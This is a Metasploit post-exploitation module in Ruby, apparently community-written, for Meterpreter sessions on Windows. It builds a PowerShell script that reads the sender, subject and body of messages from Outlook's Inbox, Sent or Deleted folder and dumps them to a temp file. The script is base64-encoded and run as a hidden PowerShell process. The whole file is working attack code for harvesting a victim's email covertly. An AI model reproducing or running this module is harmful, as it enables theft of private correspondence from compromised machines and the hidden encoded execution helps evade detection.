##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  def initialize(info={})
    super(update_info(info,
        'Name'          => '[Windows] [Gather] [Powerdumpmail]',
        'Description'   => %q{
          Meterpreter script for utilizing PowerShell to extract mails from from Outlook Express.
        },
        'License'       => MSF_LICENSE,
        'Author'        => 'Roni Bachar',
        'Platform'      => 'win' ,
        'SessionTypes'  => 'meterpreter'
    ))
 register_options(
      [
        OptString.new('FOLDER', [true, 'Folder to Extract(6-Inbox,5-Sent Items,3-Deleted Items)', 6]),
        OptString.new('COUNT', [true, 'Count of mails to extract', 10]),
        OptString.new('FILENAME', [true, 'Filename to save in temp folder', 'pmail.txt'])

      ], self.class)
end

  def run
  b = datastore['FOLDER']
  c = datastore['COUNT']
  f = datastore['filename']
  buffer = <<-eos
  $outlook = new-object -com outlook.application;
  $ns = $outlook.GetNameSpace("MAPI");
  $inbox = $ns.GetDefaultFolder($olFolderInbox)
  #checks 20 newest messages
  $messages = $inbox.Items
  $msg = $messages.GetLast()
  for ($i=0;$i -le $countmail;$i++) {
  $subject = "Subject: "+$msg.Subject
  $email = "From: " +$msg.SenderEmailAddress
  $time =  $msg.CreationTime
  $body = "Message: "+ $msg.body
  $a = $email
  $b = $subject
  $c = $body
  eos
  bufend = ('$m ="----------------------------------------------------------------------"')+"\n"+('$m >>$env:temp"\\\\')+f+('"')+"\n"+("$msg = $messages.GetPrevious()")+"\n"+"}"
  buffer = ("$olFolderInbox =")+b+"\n"+("$countmail =")+c+"\n"+ buffer+('$a >>$env:temp"\\\\')+f+('"')+"\n"+('$b >>$env:temp"\\\\')+f+('"')+"\n"+('$c >>$env:temp"\\\\')+f+('"')+"\n"+bufend
  #print buffer
  buf = Rex::Text.to_unicode(buffer)
  b64 = Rex::Text.encode_base64(buf)
  print_status('Powerdumpmail v0.1 - Created By Roni Bachar(@roni_bachar)')
  print_status('Runing Powershell...')
  #print_status("powershell -wind hidden -noni -enc "+b64)
  session.sys.process.execute("cmd /c powershell -WindowStyle hidden -enc "+b64, nil, {'Hidden' => 'true', 'Channelized' => true})
  print_status('Dumping Mails...')
  print_status('Please wait a few minutes before downloading from temp folder')
  end
end



